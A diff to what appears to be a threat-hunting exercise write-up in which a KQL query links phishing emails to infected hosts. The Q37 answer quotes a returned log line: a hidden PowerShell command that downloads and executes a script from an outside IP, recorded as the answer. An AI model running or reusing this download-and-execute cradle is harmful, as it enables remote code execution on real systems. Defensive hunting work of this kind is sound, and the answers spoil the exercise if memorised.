@@ -435,9 +435,38 @@ ProcessEvents
 
 **Q37. Let's look at the first few records. There's some suspicious powershell activity that occurs near the beginning.**<br><br>
 
+```
+let EmailAddresses = 
+Email
+| where sender == "legal.sand@verizon.com"
+| distinct reply_to;
+let EmailFileName = 
+Email
+| where sender in (EmailAddresses) or reply_to in (EmailAddresses)
+| distinct link
+| extend ParsedLink = parse_path(link)
+| project FileName = ParsedLink.Filename
+| distinct tostring(FileName);
+let BadFileNames =
+FileCreationEvents
+| where filename in (EmailFileName)
+| distinct hostname;
+ProcessEvents
+| where hostname has_any (BadFileNames)
+| where timestamp > datetime(2023-05-25T16:43:20.000Z)
+| where process_name contains "powershell"
+```
+<br>
+First result returned.<br>
+
+```
+powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('https://220.35.180.137/a'))"
+```
+<br>
+
 **Answer: 220.35.180.137**<br><br>
 
-**Q.**<br><br>
+**Q38. Which host machine did the powershell activity execute on?**<br><br>
 
 **Answer: **<br><br>
 
